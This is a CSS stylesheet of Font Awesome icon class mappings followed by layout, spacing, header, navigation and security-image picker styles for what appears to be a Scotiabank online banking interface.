  .icon-text-height:before {
    content: "\f034";
  }
  .icon-text-width:before {
    content: "\f035";
  }
  .icon-align-left:before {
    content: "\f036";
  }
  .icon-align-center:before {
    content: "\f037";
  }
  .icon-align-right:before {
    content: "\f038";
  }
  .icon-align-justify:before {
    content: "\f039";
  }
  .icon-list:before {
    content: "\f03a";
  }
  .icon-indent-left:before {
    content: "\f03b";
  }
  .icon-indent-right:before {
    content: "\f03c";
  }
  .icon-facetime-video:before {
    content: "\f03d";
  }
  .icon-picture:before {
    content: "\f03e";
  }
  .icon-pencil:before {
    content: "\f040";
  }
  .icon-map-marker:before {
    content: "\f041";
  }
  .icon-adjust:before {
    content: "\f042";
  }
  .icon-tint:before {
    content: "\f043";
  }
  .icon-edit:before {
    content: "\f044";
  }
  .icon-share:before {
    content: "\f045";
  }
  .icon-check:before {
    content: "\f046";
  }
  .icon-move:before {
    content: "\f047";
  }
  .icon-step-backward:before {
    content: "\f048";
  }
  .icon-fast-backward:before {
    content: "\f049";
  }
  .icon-backward:before {
    content: "\f04a";
  }
  .icon-play:before {
    content: "\f04b";
  }
  .icon-pause:before {
    content: "\f04c";
  }
  .icon-stop:before {
    content: "\f04d";
  }
  .icon-forward:before {
    content: "\f04e";
  }
  .icon-fast-forward:before {
    content: "\f050";
  }
  .icon-step-forward:before {
    content: "\f051";
  }
  .icon-eject:before {
    content: "\f052";
  }
  .icon-chevron-left:before {
    content: "\f053";
  }
  .icon-chevron-right:before {
    content: "\f054";
  }
  .icon-plus-sign:before {
    content: "\f055";
  }
  .icon-minus-sign:before {
    content: "\f056";
  }
  .icon-remove-sign:before {
    content: "\f057";
  }
  .icon-ok-sign:before {
    content: "\f058";
  }
  .icon-question-sign:before {
    content: "\f059";
  }
  .icon-info-sign:before {
    content: "\f05a";
  }
  .icon-screenshot:before {
    content: "\f05b";
  }
  .icon-remove-circle:before {
    content: "\f05c";
  }
  .icon-ok-circle:before {
    content: "\f05d";
  }
  .icon-ban-circle:before {
    content: "\f05e";
  }
  .icon-arrow-left:before {
    content: "\f060";
  }
  .icon-arrow-right:before {
    content: "\f061";
  }
  .icon-arrow-up:before {
    content: "\f062";
  }
  .icon-arrow-down:before {
    content: "\f063";
  }
  .icon-mail-forward:before,
  .icon-share-alt:before {
    content: "\f064";
  }
  .icon-resize-full:before {
    content: "\f065";
  }
  .icon-resize-small:before {
    content: "\f066";
  }
  .icon-plus:before {
    content: "\f067";
  }
  .icon-minus:before {
    content: "\f068";
  }
  .icon-asterisk:before {
    content: "\f069";
  }
  .icon-exclamation-sign:before {
    content: "\f06a";
  }
  .icon-gift:before {
    content: "\f06b";
  }
  .icon-leaf:before {
    content: "\f06c";
  }
  .icon-fire:before {
    content: "\f06d";
  }
  .icon-eye-open:before {
    content: "\f06e";
  }
  .icon-eye-close:before {
    content: "\f070";
  }
  .icon-warning-sign:before {
    content: "\f071";
  }
  .icon-plane:before {
    content: "\f072";
  }
  .icon-calendar:before {
    content: "\f073";
  }
  .icon-random:before {
    content: "\f074";
  }
  .icon-comment:before {
    content: "\f075";
  }
  .icon-magnet:before {
    content: "\f076";
  }
  .icon-chevron-up:before {
    content: "\f077";
  }
  .icon-chevron-down:before {
    content: "\f078";
  }
  .icon-retweet:before {
    content: "\f079";
  }
  .icon-shopping-cart:before {
    content: "\f07a";
  }
  
  .icon-dialog-close:before {
      content: "\f00d";
  }
  
  .icon-folder-close:before {
    content: "\f07b";
  }
  .icon-folder-open:before {
    content: "\f07c";
  }
  .icon-resize-vertical:before {
    content: "\f07d";
  }
  .icon-resize-horizontal:before {
    content: "\f07e";
  }
  .icon-bar-chart:before {
    content: "\f080";
  }
  .icon-twitter-sign:before {
    content: "\f081";
  }
  .icon-facebook-sign:before {
    content: "\f082";
  }
  .icon-camera-retro:before {
    content: "\f083";
  }
  .icon-key:before {
    content: "\f084";
  }
  .icon-gears:before,
  .icon-cogs:before {
    content: "\f085";
  }
  .icon-comments:before {
    content: "\f086";
  }
  .icon-thumbs-up-alt:before {
    content: "\f087";
  }
  .icon-thumbs-down-alt:before {
    content: "\f088";
  }
  .icon-star-half:before {
    content: "\f089";
  }
  .icon-heart-empty:before {
    content: "\f08a";
  }
  .icon-signout:before {
    content: "\f08b";
  }
  .icon-linkedin-sign:before {
    content: "\f08c";
  }
  .icon-pushpin:before {
    content: "\f08d";
  }
  .icon-external-link:before {
    content: "\f08e";
  }
  .icon-signin:before {
    content: "\f090";
  }
  .icon-trophy:before {
    content: "\f091";
  }
  .icon-github-sign:before {
    content: "\f092";
  }
  .icon-upload-alt:before {
    content: "\f093";
  }
  .icon-lemon:before {
    content: "\f094";
  }
  .icon-phone:before {
    content: "\f095";
  }
  .icon-unchecked:before,
  .icon-check-empty:before {
    content: "\f096";
  }
  .icon-bookmark-empty:before {
    content: "\f097";
  }
  .icon-phone-sign:before {
    content: "\f098";
  }
  .icon-twitter:before {
    content: "\f099";
  }
  .icon-facebook:before {
    content: "\f09a";
  }
  .icon-github:before {
    content: "\f09b";
  }
  .icon-unlock:before {
    content: "\f09c";
  }
  .icon-credit-card:before {
    content: "\f09d";
  }
  .icon-rss:before {
    content: "\f09e";
  }
  .icon-hdd:before {
    content: "\f0a0";
  }
  .icon-bullhorn:before {
    content: "\f0a1";
  }
  .icon-bell:before {
    content: "\f0a2";
  }
  .icon-certificate:before {
    content: "\f0a3";
  }
  .icon-hand-right:before {
    content: "\f0a4";
  }
  .icon-hand-left:before {
    content: "\f0a5";
  }
  .icon-hand-up:before {
    content: "\f0a6";
  }
  .icon-hand-down:before {
    content: "\f0a7";
  }
  .icon-circle-arrow-left:before {
    content: "\f0a8";
  }
  .icon-circle-arrow-right:before {
    content: "\f0a9";
  }
  .icon-circle-arrow-up:before {
    content: "\f0aa";
  }
  .icon-circle-arrow-down:before {
    content: "\f0ab";
  }
  .icon-globe:before {
    content: "\f0ac";
  }
  .icon-wrench:before {
    content: "\f0ad";
  }
  .icon-tasks:before {
    content: "\f0ae";
  }
  .icon-filter:before {
    content: "\f0b0";
  }
  .icon-briefcase:before {
    content: "\f0b1";
  }
  .icon-fullscreen:before {
    content: "\f0b2";
  }
  .icon-group:before {
    content: "\f0c0";
  }
  .icon-link:before {
    content: "\f0c1";
  }
  .icon-cloud:before {
    content: "\f0c2";
  }
  .icon-beaker:before {
    content: "\f0c3";
  }
  .icon-cut:before {
    content: "\f0c4";
  }
  .icon-copy:before {
    content: "\f0c5";
  }
  .icon-paperclip:before,
  .icon-paper-clip:before {
    content: "\f0c6";
  }
  .icon-save:before {
    content: "\f0c7";
  }
  .icon-sign-blank:before {
    content: "\f0c8";
  }
  .icon-reorder:before {
    content: "\f0c9";
  }
  .icon-list-ul:before {
    content: "\f0ca";
  }
  .icon-list-ol:before {
    content: "\f0cb";
  }
  .icon-strikethrough:before {
    content: "\f0cc";
  }
  .icon-underline:before {
    content: "\f0cd";
  }
  .icon-table:before {
    content: "\f0ce";
  }
  .icon-magic:before {
    content: "\f0d0";
  }
  .icon-truck:before {
    content: "\f0d1";
  }
  .icon-pinterest:before {
    content: "\f0d2";
  }
  .icon-pinterest-sign:before {
    content: "\f0d3";
  }
  .icon-google-plus-sign:before {
    content: "\f0d4";
  }
  .icon-google-plus:before {
    content: "\f0d5";
  }
  .icon-money:before {
    content: "\f0d6";
  }
  .icon-caret-down:before {
    content: "\f0d7";
  }
  .icon-caret-up:before {
    content: "\f0d8";
  }
  .icon-caret-left:before {
    content: "\f0d9";
  }
  .icon-caret-right:before {
    content: "\f0da";
  }
  .icon-columns:before {
    content: "\f0db";
  }
  .icon-sort:before {
    content: "\f0dc";
  }
  .icon-sort-down:before {
    content: "\f0dd";
  }
  .icon-sort-up:before {
    content: "\f0de";
  }
  .icon-envelope:before {
    content: "\f0e0";
  }
  .icon-linkedin:before {
    content: "\f0e1";
  }
  .icon-rotate-left:before,
  .icon-undo:before {
    content: "\f0e2";
  }
  .icon-legal:before {
    content: "\f0e3";
  }
  .icon-dashboard:before {
    content: "\f0e4";
  }
  .icon-comment-alt:before {
    content: "\f0e5";
  }
  .icon-comments-alt:before {
    content: "\f0e6";
  }
  .icon-bolt:before {
    content: "\f0e7";
  }
  .icon-sitemap:before {
    content: "\f0e8";
  }
  .icon-umbrella:before {
    content: "\f0e9";
  }
  .icon-paste:before {
    content: "\f0ea";
  }
  .icon-lightbulb:before {
    content: "\f0eb";
  }
  .icon-exchange:before {
    content: "\f0ec";
  }
  .icon-cloud-download:before {
    content: "\f0ed";
  }
  .icon-cloud-upload:before {
    content: "\f0ee";
  }
  .icon-user-md:before {
    content: "\f0f0";
  }
  .icon-stethoscope:before {
    content: "\f0f1";
  }
  .icon-suitcase:before {
    content: "\f0f2";
  }
  .icon-bell-alt:before {
    content: "\f0f3";
  }
  .icon-coffee:before {
    content: "\f0f4";
  }
  .icon-food:before {
    content: "\f0f5";
  }
  .icon-file-text-alt:before {
    content: "\f0f6";
  }
  .icon-building:before {
    content: "\f0f7";
  }
  .icon-hospital:before {
    content: "\f0f8";
  }
  .icon-ambulance:before {
    content: "\f0f9";
  }
  .icon-medkit:before {
    content: "\f0fa";
  }
  .icon-fighter-jet:before {
    content: "\f0fb";
  }
  .icon-beer:before {
    content: "\f0fc";
  }
  .icon-h-sign:before {
    content: "\f0fd";
  }
  .icon-plus-sign-alt:before {
    content: "\f0fe";
  }
  .icon-double-angle-left:before {
    content: "\f100";
  }
  .icon-double-angle-right:before {
    content: "\f101";
  }
  .icon-double-angle-up:before {
    content: "\f102";
  }
  .icon-double-angle-down:before {
    content: "\f103";
  }
  .icon-angle-left:before {
    content: "\f104";
  }
  .icon-angle-right:before {
    content: "\f105";
  }
  .icon-angle-up:before {
    content: "\f106";
  }
  .icon-angle-down:before {
    content: "\f107";
  }
  .icon-desktop:before {
    content: "\f108";
  }
  .icon-laptop:before {
    content: "\f109";
  }
  .icon-tablet:before {
    content: "\f10a";
  }
  .icon-mobile-phone:before {
    content: "\f10b";
  }
  .icon-circle-blank:before {
    content: "\f10c";
  }
  .icon-quote-left:before {
    content: "\f10d";
  }
  .icon-quote-right:before {
    content: "\f10e";
  }
  .icon-spinner:before {
    content: "\f110";
  }
  .icon-circle:before {
    content: "\f111";
  }
  .icon-mail-reply:before,
  .icon-reply:before {
    content: "\f112";
  }
  .icon-github-alt:before {
    content: "\f113";
  }
  .icon-folder-close-alt:before {
    content: "\f114";
  }
  .icon-folder-open-alt:before {
    content: "\f115";
  }
  .icon-expand-alt:before {
    content: "\f116";
  }
  .icon-collapse-alt:before {
    content: "\f117";
  }
  .icon-smile:before {
    content: "\f118";
  }
  .icon-frown:before {
    content: "\f119";
  }
  .icon-meh:before {
    content: "\f11a";
  }
  .icon-gamepad:before {
    content: "\f11b";
  }
  .icon-keyboard:before {
    content: "\f11c";
  }
  .icon-flag-alt:before {
    content: "\f11d";
  }
  .icon-flag-checkered:before {
    content: "\f11e";
  }
  .icon-terminal:before {
    content: "\f120";
  }
  .icon-code:before {
    content: "\f121";
  }
  .icon-reply-all:before {
    content: "\f122";
  }
  .icon-mail-reply-all:before {
    content: "\f122";
  }
  .icon-star-half-full:before,
  .icon-star-half-empty:before {
    content: "\f123";
  }
  .icon-location-arrow:before {
    content: "\f124";
  }
  .icon-crop:before {
    content: "\f125";
  }
  .icon-code-fork:before {
    content: "\f126";
  }
  .icon-unlink:before {
    content: "\f127";
  }
  .icon-question:before {
    content: "\f128";
  }
  .icon-info:before {
    content: "\f129";
  }
  .icon-exclamation:before {
    content: "\f12a";
  }
  .icon-superscript:before {
    content: "\f12b";
  }
  .icon-subscript:before {
    content: "\f12c";
  }
  .icon-eraser:before {
    content: "\f12d";
  }
  .icon-puzzle-piece:before {
    content: "\f12e";
  }
  .icon-microphone:before {
    content: "\f130";
  }
  .icon-microphone-off:before {
    content: "\f131";
  }
  .icon-shield:before {
    content: "\f132";
  }
  .icon-calendar-empty:before {
    content: "\f133";
  }
  .icon-fire-extinguisher:before {
    content: "\f134";
  }
  .icon-rocket:before {
    content: "\f135";
  }
  .icon-maxcdn:before {
    content: "\f136";
  }
  .icon-chevron-sign-left:before {
    content: "\f137";
  }
  .icon-chevron-sign-right:before {
    content: "\f138";
  }
  .icon-chevron-sign-up:before {
    content: "\f139";
  }
  .icon-chevron-sign-down:before {
    content: "\f13a";
  }
  .icon-html5:before {
    content: "\f13b";
  }
  .icon-css3:before {
    content: "\f13c";
  }
  .icon-anchor:before {
    content: "\f13d";
  }
  .icon-unlock-alt:before {
    content: "\f13e";
  }
  .icon-bullseye:before {
    content: "\f140";
  }
  .icon-ellipsis-horizontal:before {
    content: "\f141";
  }
  .icon-ellipsis-vertical:before {
    content: "\f142";
  }
  .icon-rss-sign:before {
    content: "\f143";
  }
  .icon-play-sign:before {
    content: "\f144";
  }
  .icon-ticket:before {
    content: "\f145";
  }
  .icon-minus-sign-alt:before {
    content: "\f146";
  }
  .icon-check-minus:before {
    content: "\f147";
  }
  .icon-level-up:before {
    content: "\f148";
  }
  .icon-level-down:before {
    content: "\f149";
  }
  .icon-check-sign:before {
    content: "\f14a";
  }
  .icon-edit-sign:before {
    content: "\f14b";
  }
  .icon-external-link-sign:before {
    content: "\f14c";
  }
  .icon-share-sign:before {
    content: "\f14d";
  }
  .icon-compass:before {
    content: "\f14e";
  }
  .icon-collapse:before {
    content: "\f150";
  }
  .icon-collapse-top:before {
    content: "\f151";
  }
  .icon-expand:before {
    content: "\f152";
  }
  .icon-euro:before,
  .icon-eur:before {
    content: "\f153";
  }
  .icon-gbp:before {
    content: "\f154";
  }
  .icon-dollar:before,
  .icon-usd:before {
    content: "\f155";
  }
  .icon-rupee:before,
  .icon-inr:before {
    content: "\f156";
  }
  .icon-yen:before,
  .icon-jpy:before {
    content: "\f157";
  }
  .icon-renminbi:before,
  .icon-cny:before {
    content: "\f158";
  }
  .icon-won:before,
  .icon-krw:before {
    content: "\f159";
  }
  .icon-bitcoin:before,
  .icon-btc:before {
    content: "\f15a";
  }
  .icon-file:before {
    content: "\f15b";
  }
  .icon-file-text:before {
    content: "\f15c";
  }
  .icon-sort-by-alphabet:before {
    content: "\f15d";
  }
  .icon-sort-by-alphabet-alt:before {
    content: "\f15e";
  }
  .icon-sort-by-attributes:before {
    content: "\f160";
  }
  .icon-sort-by-attributes-alt:before {
    content: "\f161";
  }
  .icon-sort-by-order:before {
    content: "\f162";
  }
  .icon-sort-by-order-alt:before {
    content: "\f163";
  }
  .icon-thumbs-up:before {
    content: "\f164";
  }
  .icon-thumbs-down:before {
    content: "\f165";
  }
  .icon-youtube-sign:before {
    content: "\f166";
  }
  .icon-youtube:before {
    content: "\f167";
  }
  .icon-xing:before {
    content: "\f168";
  }
  .icon-xing-sign:before {
    content: "\f169";
  }
  .icon-youtube-play:before {
    content: "\f16a";
  }
  .icon-dropbox:before {
    content: "\f16b";
  }
  .icon-stackexchange:before {
    content: "\f16c";
  }
  .icon-instagram:before {
    content: "\f16d";
  }
  .icon-flickr:before {
    content: "\f16e";
  }
  .icon-adn:before {
    content: "\f170";
  }
  .icon-bitbucket:before {
    content: "\f171";
  }
  .icon-bitbucket-sign:before {
    content: "\f172";
  }
  .icon-tumblr:before {
    content: "\f173";
  }
  .icon-tumblr-sign:before {
    content: "\f174";
  }
  .icon-long-arrow-down:before {
    content: "\f175";
  }
  .icon-long-arrow-up:before {
    content: "\f176";
  }
  .icon-long-arrow-left:before {
    content: "\f177";
  }
  .icon-long-arrow-right:before {
    content: "\f178";
  }
  .icon-apple:before {
    content: "\f179";
  }
  .icon-windows:before {
    content: "\f17a";
  }
  .icon-android:before {
    content: "\f17b";
  }
  .icon-linux:before {
    content: "\f17c";
  }
  .icon-dribbble:before {
    content: "\f17d";
  }
  .icon-skype:before {
    content: "\f17e";
  }
  .icon-foursquare:before {
    content: "\f180";
  }
  .icon-trello:before {
    content: "\f181";
  }
  .icon-female:before {
    content: "\f182";
  }
  .icon-male:before {
    content: "\f183";
  }
  .icon-gittip:before {
    content: "\f184";
  }
  .icon-sun:before {
    content: "\f185";
  }
  .icon-moon:before {
    content: "\f186";
  }
  .icon-archive:before {
    content: "\f187";
  }
  .icon-bug:before {
    content: "\f188";
  }
  .icon-vk:before {
    content: "\f189";
  }
  .icon-weibo:before {
    content: "\f18a";
  }
  .icon-renren:before {
    content: "\f18b";
  }
  
  
  html, body { padding: 0; margin: 0; font-family: Arial,sans-serif; height: 100%; min-height: 100%!important; color: #606060; }
html { -webkit-tap-highlight-color: rgba(0,0,0,0); background: #E8E6DE url(../images/body_top_bg.png) left top repeat-x!important; height: auto !important; background-color: #E8E6DE; }
body { height: auto !important; background: #E8E6DE  url(../images/body_center_bg.png) center top repeat-y!important; margin-top: -1px!important; border-bottom: 140px solid #E8E6DE; font-size: 1.2em; overflow-y: scroll; }
.bold-txt { font-weight: bold !important }
.w-no-wrap { white-space: nowrap!important }
a { border-bottom: none }
/*page-loader*/
.date-right{right: 6px!important;}
.Height200px { height: 200px; overflow-y: scroll; }
.positionnone { position: inherit!important }
.inlineBlock { display: inline-block; width: 60%; }
.alignright { text-align: right }
.aligntop { vertical-align: text-top!important }
.veraligntop { vertical-align: top!important  }
.veralignmiddle { vertical-align: middle!important }
.textlignmiddle { vertical-align: text-bottom }
.aligncenter { text-align: center; vertical-align: text-top; margin-top: 15%; }
.aligncenter-img-carosal { text-align: center; vertical-align: text-top; margin-left: auto; margin-right: auto; }
.centeralign { text-align: center; vertical-align: text-top; }
.bottomalign { text-align: center; vertical-align: bottom!important; }
.mrgn-right-50 { margin-right: 50px !important }
.mrgn-top-10 { margin-top: 10px !important }
.mrgn-top-18 { margin-top: 18px !important; }
.mrgn-top-32 { margin-top: 32px !important }
.mrgn-top-24 { margin-top: 24px !important }
.mrgn-top-25 { margin-top: 25px !important }
.mrgn-top-20 { margin-top: 20px !important }
.mrgn-top-15 { margin-top: 15px !important }
.mrgn-top-8 { margin-top: 8px !important }
.mrgn-top-7 { margin-top: 7px !important }
.mrgn-top-6 { margin-top: 6px !important }
.mrgn-top-5 { margin-top: 5px !important }
.mrgn-top-3 { margin-top: 3px !important }
.mrgn-btm-0 { margin-bottom: 0px !important }
.mrgn-btm-5 { margin-bottom: 5px !important }
.mrgn-btm-10 { margin-bottom: 10px !important }
.mrgn-btm-15 { margin-bottom: 15px !important }
.mrgn-btm-20 { margin-bottom: 20px !important }
.pad-lft-5 { padding-left: 5px !important }
.pad-lft-15 { padding-left: 15px !important }
.pad-lft-20 { padding-left: 20px !important }
.pad-lft-25 { padding-left: 25px !important }
.pad-lft-30 { padding-left: 30px !important }
.pad-lft-40 { padding-left: 40px !important }
.pad-lft-50 { padding-left: 50px !important }
.mar-lft-10 { margin-left: 10px !important }
.mar-lft-5 { margin-left: 5px !important }
.pad-lft-0 { padding-left: 0px !important }
.pad-right-0 { padding-right: 0px !important }
.margin15 { margin: 15px !important }
.margin0 { margin: 0!important }
.butnmargin { margin: 10px 15px -5px 0!important }
.mrgn-btm-minus5 { margin-bottom: -5px!important }
.mrgn-btm-minus10 { margin-bottom: -10px!important }
.mrgn-top-minus1 { margin-top: -1px !important }
.mrgn-top-minus5 { margin-top: -5px !important }
.mrgn-top-minus10 { margin-top: -10px !important }
.mrgn-top-minus20 { margin-top: -20px !important }
.mrgn-top-minus30 { margin-top: -30px !important }
.mrgn-top-minus50 { margin-top: -50px !important }
.mrgn-top-0 { margin-top: 0px !important }
.mrgn-top-90 { margin-top: 90px !important }
.pad-btm-15 { padding-bottom: 15px !important }
.pad-btm-20 { padding-bottom: 20px !important }
.pad-btm-24 { padding-bottom: 24px !important }
.pad-btm-25 { padding-bottom: 25px !important }
.pad-btm-30 { padding-bottom: 30px !important }
.pad-btm-10 { padding-bottom: 10px !important }
.pad-btm-8 {  padding-bottom: 8px !important}
.pad-btm-5 { padding-bottom: 5px !important }
.pad-btm-3 { padding-bottom: 3px !important }
.pad-btm-4 { padding-bottom: 4px !important }
.pad-btm-0 { padding-bottom: 0 !important }
.padding15 { padding: 15px!important }
.padding10 { padding: 10px!important }
.padding30 { padding: 25px!important }
.mrgn-right-minus10 { margin-right: -10px !important }
.mrgn-right-0 { margin-right: 0px !important }
.mrgn-right-min10 { margin-right: -10px !important }
.pad-lft-10 { padding-left: 10px !important }
.pad-lft-12 { padding-left: 12px !important }
.pad-right-10 { padding-right: 10px !important }
.pad-top-1 {padding-top: 1px !important }
.pad-top-3 {padding-top: 3px !important }
.pad-top-5 {padding-top: 5px !important }
.pad-top-10 { padding-top: 10px !important }
.pad-top-15 { padding-top: 15px !important }
.pad-top-20 { padding-top: 20px !important }
.pad-top-25 { padding-top: 25px !important }
.pad-top-30 { padding-top: 30px !important }
.pad-top-35 { padding-top: 35px !important }
.pad-top-0 { padding-top: 0px !important }
.mrgn-right-3 { margin-right: 3px !important }
.mrgn-right-5 { margin-right: 5px !important }
.mrgn-right-10 { margin-right: 10px !important }
.pad-right-25 { padding-right: 25px !important }
.pad-right-30 { padding-right: 30px !important }
.pad-right-15 { padding-right: 15px !important }
.mrgn-lft-5 { margin-left: 5px !important }
.mrgn-lft-10 { margin-left: 10px !important }
.mrgn-lft-15 { margin-left: 15px !important }
.mrgn-lft-20 { margin-left: 20px !important }
.mrgn-lft-25 { margin-left: 25px !important }
.mrgn-lft-30 { margin-left: 30px !important }
.mrgn-lft-35 { margin-left: 35px !important }
.mrgn-lft-100 { margin-left: 100px !important }
.mrgn-lft-90 { margin-left: 90px !important }
.mrgn-lft-0 { margin-left: 0px!important }
.mrgn-lft-minus20 { margin-left: -20!important; left: -10px; position: relative; }
.mrgn-lft-minus10 { margin-left: -10!important; left: -5px; position: relative; }
.mrgn-lft-minus-10 { margin-left: -10px!important; }
.padding5 { padding: 5px }
.padding15 { padding: 15px }
.padding0 { padding: 0px!important; }
.margin5 { margin: 5px }
.width30px { width: 30px }
.width75px { width: 75px!important }
.mrgn-left-5% { padding-left: 15%!important }
.mrgn-right-15percent { margin-right: 15%!important }
.mrgn-right-20percent { margin-right: 20%!important }
.mrgn-btm-1percent { margin-bottom: 1.5%!important }
.mrgn-top-2percent { margin-top: 2.5%!important }
.width-100-percent{width: 100% !important;}
.width-80-percent{width: 80% !important;}
.width-72-percent{width: 72% !important;}
.width-60-percent{width: 60% !important;}
.width-20-percent{width: 20% !important;}
.width-13-percent{width: 13% !important;}
.width-38-percent{width: 38% !important;}
.RUIFW-page-loader { width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4)!important; position: absolute; top: 0; z-index: 999999999; }
.RUIFW-page-loader .RUIFW-loader { display: block; position: relative; top: 30%; margin: 0 auto; text-align: center; color: #FFFFFF; }
/*font-size-settings*/
html { /* font-size: 62.5%; */ }
body { /* font-size: 1.4rem; */ } /* =14px _NO__DOTCOMMA__AFTER__*/
h1 { font-size: 2.4rem; font-size: 24px; } /* =24px */
h2, h2 a { font-size: 2rem; font-size: 20px; color: #333333 !important; }
h3 { font-size: 1.8rem; font-size: 18px; color: #606060; min-height: 26px; }
h4 { font-size: 1.6rem; font-size: 16px; color: #606060; }
h5 { font-size: 1.4rem; color: #606060; }
h6 { font-size: 1.4rem; color: #606060 !important; }
h6 a { font-size: 18px; color: #333333 !important; }
.bottom-box h2 { font-size: 1.8em; color: #333333 !important; }
.bottom-box h2 a { font-size: 1.8em; color: #333333 !important; }
textarea { resize: none }
input[type=date] { -webkit-appearance: none }
/*h3 div{float: right;margin-right:20px; vertical-align:top;   }
h3 div:last-child{float: none; }
h3 div.quick-menu{position: relative; /*margin:0 0 0 15px!important; float:right;  vertical-align:top; clear:both; }_NO__DOTCOMMA__AFTER__*/
h3 div { float: left; font-size: 0.9em; max-width: 75%; }
h3 div:last-child { float: none }
h3 div.quick-menu { position: relative; margin: 0 0 0 5px; }
ol { padding: 0 0 0 15px }
ul[class*="RUIFW-list"] { font-size: 1.3rem; font-size: 13px; list-style: none outside none; padding-left: 20px; }
ul[class*="RUIFW-list"] li { padding: 2px 4px }
ul[class*="RUIFW-list"] li:before { color: #333333; content: "\f105"; font-family: fontAwesome; left: -18px; position: absolute; top: 0; }
ul[class*="RUIFW-list"] li + li { margin-top: 10px }
/*page layout setting*/
.RUIFW-page-wrap, .RUIFW-page-footer { max-width: 980px }
.RUIFW-page-footer { margin-top: 20px; background: #E8E6DE; text-align: inherit; min-width: 768px; }
.RUIFW-page-wrap { background: #fff; margin-top: 40px; margin-bottom: 0; -webkit-box-shadow: 0px 1px 3px 0px rgba(134, 134, 134, 1); -moz-box-shadow: 0px 1px 3px 0px rgba(134, 134, 134, 1); box-shadow: 0px 1px 3px 0px rgba(134, 134, 134, 1); }
section { border-top: 5px solid #f1f1f1; border-right: 5px solid #f1f1f1; border-left: 5px solid #f1f1f1; padding-bottom: 15px; }
/*color code*/
a { color: #2A5DB0; text-decoration: none; display: inline-block; }
a:hover { color: #16B2EC; /*text-decoration: underline; border-bottom: 1px dotted; margin-bottom: 0;*/ }
a img { border: none }
.clear { clear: both }
.desk-icons { margin-right: 30px; margin-top: 20px; }
.desk-icons a { color: #000; text-decoration: none; padding: 0 0 0 5px; font-size: 16px; }
/*page header*/
.RUIFW-container-header { margin: 0 }
.RUIFW-page-header { height: 81px }
*[class*=RUIFW-brand] { background-image: url("../images/scotiabank_logo.svg"); width: 357px; height: 41px; margin: 5px 0 0 20px; }
.RUIFW-page-header *[class*=RUIFW-brand] { top: 16px }
.RUIFW-container-quick-links { position: absolute; right: 20px; top: -27px; width: 430px !important; background: #f5f5f5; font-size: 12px; border: solid 4px #d8d8d8  !important; color: #606060; }
.RUIFW-container-quick-links ul { width: 100%; margin: 0; display: table; }
.RUIFW-nav-quick-links li {width: 39%; height: 46px; }
.RUIFW-nav-quick-links li.lftbox { width: 60%; border-right: 1px solid #d4d4d4; -webkit-box-shadow: 1px 0px 0px 0px rgba(255, 255, 255, 0.75); -moz-box-shadow: 1px 0px 0px 0px rgba(255, 255, 255, 0.75); box-shadow: 1px 0px 0px 0px rgba(255, 255, 255, 0.75); padding:0px; }
.RUIFW-nav-quick-links li.lftbox.bold-txt{padding:7px 7px 0px 7px; }
.RUIFW-nav-quick-links li span { display: block; vertical-align: middle; padding: 1px; }
.RUIFW-nav-quick-links li span.h-separator { border-top: 1px solid #d4d4d4; -webkit-box-shadow: inset 0 2px 1px -1px rgba(255, 255, 255, 0.75); -moz-box-shadow: inset 0 2px 1px -1px rgba(255, 255, 255, 0.75); box-shadow: inset 0 2px 1px -1px rgba(255, 255, 255, 0.75); margin:0 7px 0px 7px; padding:7px 0px 0px 0px;}
.RUIFW-nav-quick-links li .h-separator .pull-right{ width:80%;}
.RUIFW-nav-quick-links li span a { border-left: 0; border-right: 0; color: #606060; font-size: 12px; padding: 0; }
.RUIFW-nav-quick-links li a { border-left: 1px dotted #000000; border-right: medium none; color: #000000; font-size: 1.1rem; padding: 0 10px; }
.RUIFW-nav-quick-links li a:hover { background: transparent; text-decoration: underline; cursor: pointer; }
.RUIFW-nav-main > li > a { border-right: none; font-size: 15px; font-weight: normal; padding: 12px!important; border-top: 1px solid #D81E05; line-height: 20px; text-shadow: none; filter: none!important; }
.RUIFW-bg-bar .RUIFW-bg-main-nav { filter: none!important }
.RUIFW-container-well { margin-bottom: 0px }
a:focus { outline: none!important; text-decoration: none; }
.headTopLinks { float: right !important; text-align: right; }
.headTopLinks a { margin: 10px 0 0 10px }
.headTopLinks form { display:inline-block;}
.RUIFW-page-header *[class*=RUIFW-brand] { position: relative; top: 20px; }
.RUIFW-nav-main > li.has-submenu a:after { padding: 3px 0 0 9px!important }
/*------ by Mukkaram --------------------*/
.grey-box { background: #F1F1F1; padding: 15px; margin: 0 0 0 5px; border-radius: 4px; }
.grey-box2 { background: #F1F1F1; padding: 0; margin: 0; }
.red-box { background: #ffffff; padding: 15px; margin: 0; border-left: 1px solid #D7D7D7; border-bottom: 1px solid #D7D7D7; border-right: 1px solid #D7D7D7; }
.red-box .accsec .form-control { font-size: 1em; margin: 10px 0 10px 0; }
.pad-2px { padding: 2px }
.box-hr-separator { border-top: 1px solid #d8d8d8; border-bottom: 1px solid #d8d8d8; margin: 10px 0; padding: 10px; }
.box-hr-separator2 { border-bottom: 1px solid #d7d7d7; margin: 10px 0; padding: 10px; }
.box-hr-separator3 { background: #d7d7d7; margin: 10px 0 10px 0; height: 1px; width: 100%; }
.box-hr-separator4 { border-bottom: 1px solid #d7d7d7; padding: 10px 0 15px 0; margin: 0 15px 0 15px; }
.box-hr-separator5 { border-bottom: 1px solid #d7d7d7; padding: 15px 0 15px 0; margin: 0 15px 0 15px; }
.box-hr-separator.pull-up { margin-top: -10px; border-top: none; }
.vertical-separator { border-right: 1px solid #c5c5c5 }
.mandatory { color: #D81E05 }
.marg-left15px { margin-left: 15px!important }
.security-img-container, .security-img-container-selected { text-align: center }
.security-img-container span.img-holder, .payee-img span.img-holder { width: 65px; height: 65px; cursor: pointer; }
.security-img-container-selected span.img-holder { width: 65px; height: 65px; }
.security-img-container span.img-holder img, .security-img-container-selected span.img-holder img, .payee-img span.img-holder img { width: 75px; height: 75px; padding: 2px; margin: 0 15px 15px 0; border: 2px solid #; }
.security-img-container span.img-holder img.selected, .security-img-container-selected span.img-holder img.selected, .payee-img span.img-holder img.selected { border: 3px solid #D81E05 }
.security-img-container span.img-holder img:hover, .payee-img span.img-holder img:hover { cursor: pointer; filter: progid:DXImageTransform.Microsoft.Matrix(/* IE6�IE9 */ M11=0.9999619230641713, M12=-0.008726535498373935, M21=0.008726535498373935, M22=0.9999619230641713,SizingMethod='auto expand'); transform: scale(1.1); -ms-transform: scale(1.1); /* IE 9 */ -moz-transform: scale(1.1); /* Firefox */ -webkit-transform: scale(1.1); /* Safari and Chrome */ -o-transform: scale(1.1); /* Opera */ }
